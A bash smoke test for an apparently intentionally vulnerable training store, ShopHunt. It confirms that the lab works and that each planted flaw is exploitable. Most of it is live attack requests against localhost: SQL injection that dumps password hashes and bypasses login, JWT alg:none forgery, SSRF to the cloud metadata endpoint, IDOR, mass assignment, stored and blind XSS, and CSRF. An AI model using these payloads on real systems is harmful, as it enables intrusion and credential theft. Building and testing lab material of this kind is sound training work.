#!/usr/bin/env bash
# ShopHunt smoke test — verifies the store works AND every vuln is exploitable.
# Run it AFTER `docker compose up --build` is healthy.
#
#   ./docs/smoke-test.sh
#   API=http://localhost:4000 WEB=http://localhost:5173 ./docs/smoke-test.sh
#
# Requires INSTRUCTOR_MODE=on in .env for the instructor-mode checks (optional).
set -u
B="${API:-http://localhost:4000}"
F="${WEB:-http://localhost:5173}"
TKN="${INSTRUCTOR_PATH_TOKEN:-change-me-instructor-2f9c}"
P=0; FA=0
chk(){ if echo "$2" | grep -q "$3"; then echo "PASS: $1"; P=$((P+1)); else echo "FAIL: $1 -> $(echo "$2" | head -c 140)"; FA=$((FA+1)); fi; }

echo "== Store (normal app) =="
chk "catalog list" "$(curl -s "$B/api/products")" '"products"'
SU=$(curl -s -X POST "$B/api/auth/signup" -H 'Content-Type: application/json' -d "{\"email\":\"smoke$$@test.local\",\"password\":\"P1!\",\"name\":\"Smoke\"}")
TOK=$(echo "$SU" | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
chk "signup" "$SU" '"token"'
chk "login seeded user" "$(curl -s -X POST "$B/api/auth/login" -H 'Content-Type: application/json' -d '{"email":"alice@shophunt.local","password":"Passw0rd!"}')" '"token"'
chk "add to cart" "$(curl -s -X POST "$B/api/cart/items" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"product_id":1,"quantity":2}')" 'subtotal_cents'
chk "checkout" "$(curl -s -X POST "$B/api/orders/checkout" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"ship_name":"x","ship_address":"y"}')" 'order_id'
chk "order history" "$(curl -s "$B/api/orders" -H "Authorization: Bearer $TOK")" '"orders"'
chk "post review" "$(curl -s -X POST "$B/api/products/1/reviews" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"rating":5,"body":"ok"}')" '"reviews"'

echo; echo "== Vulnerabilities =="
chk "1  SQLi (error-based)" "$(curl -s "$B/api/products?search='")" 'SQL syntax'
chk "1  SQLi (UNION dumps password hashes)" "$(curl -s "$B/api/products?order=1&search=zz%25%27%29%20UNION%20SELECT%201,email,password_hash,4,%27c%27,%27i%27,7,8,name%20FROM%20users--%20-")" '\$2a\$10\$'
chk "1  SQLi (v1 auth bypass, no password)" "$(curl -s -X POST "$B/api/v1/auth/login" -H 'Content-Type: application/json' -d "{\"email\":\"admin@shophunt.local' -- \",\"password\":\"x\"}")" '"role":"admin"'
T2=$(curl -s -X POST "$B/api/auth/login" -H 'Content-Type: application/json' -d '{"email":"bob@shophunt.local","password":"Passw0rd!"}' | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
chk "2  IDOR (another user's order)" "$(curl -s "$B/api/orders/1" -H "Authorization: Bearer $T2")" 'ship_address'
chk "2  IDOR (another user's profile)" "$(curl -s "$B/api/users/1" -H "Authorization: Bearer $T2")" '"email"'
chk "5  Mass assignment (role->admin)" "$(curl -s -X PATCH "$B/api/users/me" -H "Authorization: Bearer $T2" -H 'Content-Type: application/json' -d '{"role":"admin"}')" '"role":"admin"'
chk "3  Broken access control (admin API)" "$(curl -s "$B/api/admin/users" -H "Authorization: Bearer $T2")" '"users"'
FG=$(python3 -c "import base64,json;h=base64.urlsafe_b64encode(b'{\"alg\":\"none\",\"typ\":\"JWT\"}').rstrip(b'=').decode();p=base64.urlsafe_b64encode(json.dumps({'sub':999,'role':'admin','name':'x','email':'e'}).encode()).rstrip(b'=').decode();print(h+'.'+p+'.')" 2>/dev/null)
chk "4  JWT alg:none forgery" "$(curl -s "$B/api/admin/users" -H "Authorization: Bearer $FG")" '"users"'
# 6 business logic: negative qty + coupon stacking
curl -s -X POST "$B/api/cart/items" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"product_id":2,"quantity":-1}' >/dev/null
chk "6  Business logic (coupon stacking)" "$(curl -s -X POST "$B/api/orders/checkout" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"coupon_codes":["WELCOME10","VIP20","SAVE5"]}')" 'discount_cents'
chk "7  SSRF (steal fake IAM creds)" "$(curl -s -X POST "$B/api/uploads/avatar/import" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/role"}')" 'AKIAI44QH8DHBLABFAKE'
chk "7  SSRF impact (cloud-sync accepts creds)" "$(curl -s -X POST "$B/api/v1/integrations/cloud-sync" -H 'Content-Type: application/json' -d '{"access_key":"AKIAI44QH8DHBLABFAKE"}')" 'shophunt-prod-backups'
chk "9  Stored XSS (review stored raw)" "$(curl -s -X POST "$B/api/products/2/reviews" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"rating":5,"body":"<img src=x onerror=alert(1)>"}'; curl -s "$B/api/products/2")" '<img src=x onerror=alert(1)>'
chk "10 Blind XSS (ticket accepted; bot fires in ~15s)" "$(curl -s -X POST "$B/api/tickets" -H 'Content-Type: application/json' -d '{"email":"a@b.c","subject":"x","body":"<img src=x onerror=1>"}')" '"id"'
chk "11 CSRF endpoint (cookie-auth, urlencoded)" "$(curl -s -X POST "$B/api/users/me/email" -H "Authorization: Bearer $TOK" --data "email=csrf$$@test.local")" 'email updated'
RL=$(for i in $(seq 1 10); do curl -s -o /dev/null -w '%{http_code}\n' -X POST "$B/api/auth/login" -H 'Content-Type: application/json' -d '{"email":"x@x","password":"y"}'; done | grep -c 429)
chk "12 Missing rate limit (no 429s)" "$RL" '^0$'
chk "13 Info disclosure (verbose stack)" "$(curl -s "$B/api/products?search='")" '"stack"'

echo; echo "== Recon surface (frontend) =="
chk "SPA loads" "$(curl -s "$F/")" '<title>ShopHunt</title>'
chk "robots.txt" "$(curl -s -o /dev/null -w '%{http_code}' "$F/robots.txt")" '200'
chk "sitemap.xml" "$(curl -s -o /dev/null -w '%{http_code}' "$F/sitemap.xml")" '200'
chk "leaked /.git/config" "$(curl -s -o /dev/null -w '%{http_code}' "$F/.git/config")" '200'
JS=$(curl -s "$F/" | grep -oE '/assets/index-[^"]+\.js' | head -1)
[ -n "$JS" ] && chk "hardcoded secret in JS bundle" "$(curl -s "$F$JS")" 'shophunt_internal_'
[ -n "$JS" ] && chk "source map served" "$(curl -s -o /dev/null -w '%{http_code}' "$F$JS.map")" '200'

echo; echo "== Instructor mode (needs INSTRUCTOR_MODE=on) =="
MAP=$(curl -s "$B/api/instructor/$TKN/map")
if echo "$MAP" | grep -q FLAGSHIP; then chk "instructor map (answer key)" "$MAP" 'FLAGSHIP'; chk "instructor hidden on bad token" "$(curl -s -o /dev/null -w '%{http_code}' "$B/api/instructor/wrong/map")" '404'
else echo "SKIP: instructor mode is OFF (set INSTRUCTOR_MODE=on to test)"; fi

echo; echo "============================================"
echo "RESULT: $P passed, $FA failed"
[ "$FA" -eq 0 ] && echo "ALL GREEN ✅" || echo "see FAIL lines above"
exit "$FA"
